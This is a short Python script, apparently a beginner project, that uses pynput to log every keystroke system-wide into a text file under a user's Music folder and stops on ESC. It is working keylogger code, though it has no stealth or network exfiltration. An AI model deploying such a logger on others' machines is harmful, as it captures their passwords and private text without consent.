from pynput.keyboard import Key, Listener
import os

# File to store logs
keys_information = "key_log.txt"

# Correct Linux path handling
file_path = "/home/ruhari/Music/"
log_file = file_path + keys_information

keys = []

# Ensure directory exists
os.makedirs(file_path, exist_ok=True)


def write_to_file(key):
    """
    Writes key presses into a file in a readable format.
    """
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")

        if k == "Key.space":
            f.write(" ")
        elif k == "Key.enter":
            f.write("\n")
        elif k == "Key.backspace":
            f.write("[BACKSPACE]")
        elif "Key" not in k:
            f.write(k)


def on_press(key):
    """
    Triggered when a key is pressed.
    """
    print(key)
    write_to_file(key)


def on_release(key):
    """
    Stops the logger when ESC is pressed.
    """
    if key == Key.esc:
        return False


# Start listener (FIXED VERSION)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()